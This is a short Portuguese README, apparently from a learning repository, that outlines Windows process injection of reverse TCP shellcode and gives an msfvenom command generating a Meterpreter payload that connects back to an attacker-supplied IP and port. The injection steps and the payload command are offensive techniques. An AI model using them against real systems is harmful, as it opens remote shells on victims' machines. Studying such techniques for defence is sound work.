# ShellCode Injection of an Reverse TCP exploit

## Passos de funcionamento
* Obter o controlo de um processo, ou criar um (como se pretende no ficheiro process_injection_paint.cpp);
* Alocar um buffer na memória do processo com as permissões necessárias;
* Escrever o conteúdo do shellcode no buffer alocado na memória do processo;
* Criar uma thread que correrá o que foi alocado e escrito no processo.

## Criar o ShellCode

Para criar o shell code foi usada a framework Metasploit. Com esta framework o shellcode é criado com apenas um comando:

```shell
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter LHOST="o nosso IP" LPORT="porta de acesso" -f c --var-name=shellCode
```